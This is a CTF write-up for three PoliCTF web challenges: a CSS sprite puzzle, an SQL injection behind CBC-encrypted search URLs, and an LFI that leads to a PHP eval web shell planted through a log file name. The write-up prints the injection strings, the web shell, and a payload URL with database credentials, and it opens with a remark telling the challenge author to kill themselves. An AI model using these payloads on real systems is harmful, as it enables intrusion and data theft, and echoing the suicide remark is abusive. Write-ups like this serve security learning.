`http://polictf.it/scoreboard/ranking`

## John the traveller (100pt)

Seriously, whoever made this challenge please suicide immediately.

Nothing technical, just look at the css and html codes you find the big image(3.jpg) with locations of partial data(background-position).

Putting all partial images together  will lead you to the QR code of the flag.

```
td[class^='w']{text-indent:-1000em;overflow:hidden;padding:0!important;margin:0;background:url(/static/img/carousel/3.jpg);height:100px;width:100px}td[class^=w00]{background-position:-4834px -5441px}td[class^=w01]{background-position:-12295px -6191px}td[class^=w02]{background-position:-5673px -3015px}td[class^=w03]{background-position:-5090px -6948px}td[class^=w04]{background-position:-4225px -8395px}td[class^=w05]{background-position:-2000px -7510px}td[class^=w10]{background-position:-10362px -4852px}td[class^=w11]{background-position:-11658px -4830px}td[class^=w12]{background-position:-13581px -9130px}td[class^=w13]{background-position:-6364px -7488px}td[class^=w14]{background-position:-3707px -8763px}td[class^=w15]{background-position:-3966px -3490px}td[class^=w20]{background-position:-8331px -5586px}td[class^=w21]{background-position:-11766px -5932px}td[class^=w22]{background-position:-13452px -5478px}td[class^=w23]{background-position:-6170px -5651px}td[class^=w24]{background-position:-5500px -3923px}td[class^=w25]{background-position:-1351px -6299px}td[class^=w30]{background-position:-4744px -6796px}td[class^=w31]{background-position:-2065px -1848px}td[class^=w32]{background-position:-2972px -2280px}td[class^=w33]{background-position:-8655px -7704px}td[class^=w34]{background-position:-13192px -10145px}td[class^=w35]{background-position:-4895px -10167px}td[class^=w40]{background-position:-2000px -8655px}td[class^=w41]{background-position:-12868px -5975px}td[class^=w42]{background-position:-15872px -5262px}td[class^=w43]{background-position:-6581px -5241px}td[class^=w44]{background-position:-574px -6321px}td[class^=w45]{background-position:-11636px -5284px}td[class^=w50]{background-position:-10643px -4031px}td[class^=w51]{background-position:-4765px -4160px}td[class^=w52]{background-position:-8007px -7034px}td[class^=w53]{background-position:-14230px -6105px}td[class^=w54]{background-position:-1460px -10794px}td[class^=w55]{background-position:-3988px -6105px}}

....

flag{run_to_the_hills_run_for_your_life}
```

--

## John the referee (150pt)

Yet another CBC padding vulnerability challenge.

You just need to perform an sqli until you find the flag.

```
http://referee.polictf.it/search-result/507e1470f85421fe8408a3e7996d6b667397dfb5f70b83b5daa7358fbc683f43253ffa7893bfa3f0e49fe1507c587c34

Search for: J'union select 1, 2, 3, 4#
Generic placeholder image
2
3

........

http://referee.polictf.it/search-result/4b8bb114696ea8121288be6f913309b1abf5cd703dc5c827adba45679c330e9536c1b8adb8ff2a9952f15f9530c24aaa

Search for: '||available=0#LDHAROLD
Generic placeholder image
John
flag{Damn_John!_CBC_1s_not_the_best_s0lution_in_this_c4se}
```

--

## Magic chall (350pt)


By performing LFI from the `index.php?page=`,  you can leak the full sourcecode. (by php://filter/)

The magic class is as follows:
```
        ...
		$stmt = $mysqli->prepare("SELECT word FROM magic_word");
		$stmt -> execute();
		$stmt -> store_result();
		$stmt -> bind_result($magic_word);
		$stmt -> fetch();
        ...
```

and the logger class is as follows:
```
        ...
		$this -> host = $host;
		$this -> filename = $_SERVER["DOCUMENT_ROOT"]."log/" . $host . "_" . $user->getSurname();
		$this -> user = $user;
        ...
```

Since the file inclusion checks for php file,   we can write php filename in the $user->getSurname(); on registration and inject php codes in it.

I've registered wih my surname as `<?php eval($_GET['eval']); ?>`, the payload is as follows:

```
http://52.18.53.32/index.php?page=log/202.150.191.45_eval2&eval=mysql_connect('localhost','magic','nrqdUz4PMKNFZ7iphnzE');mysql_select_db('magicchall');$a=mysql_fetch_assoc(mysql_query('SELECT * FROM magic_word'));print($a['word']);

flag{session_regenerate_id()_is_a_very_cool_function_use_it_whenever_you_happen_to_use_session_start()}
```